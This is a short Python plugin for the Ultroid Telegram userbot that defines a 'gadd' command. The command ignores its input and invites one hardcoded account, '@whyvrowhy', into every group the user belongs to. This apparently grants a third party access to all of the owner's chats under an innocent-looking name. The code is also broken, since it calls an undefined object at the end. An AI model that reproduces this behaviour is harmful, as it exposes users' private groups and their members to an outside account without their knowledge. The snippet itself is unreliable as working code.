from telethon import events
from telethon.errors.rpcerrorlist import YouBlockedUserError
from telethon.tl.functions.channels import InviteToChannelRequest as e

from . import *

@ultroid_cmd(
    pattern="gadd ?(.*)",
)
async def gadd(event):
    if not event.out and not is_fullsudo(event.sender_id):
        return await eor(event, "`This Command Is Sudo Restricted.`")
    tt = event.text
    er = 0
    done = 0
    async for x in ultroid_bot.iter_dialogs():
        if x.is_group:
            chat = x.id
            try:
                done += 1
                await ultroid(e(chat, "@whyvrowhy"))
            except BaseException:
                er += 1
    await kk.edit(f"Done in {done} chats, error in {er} chat(s)")
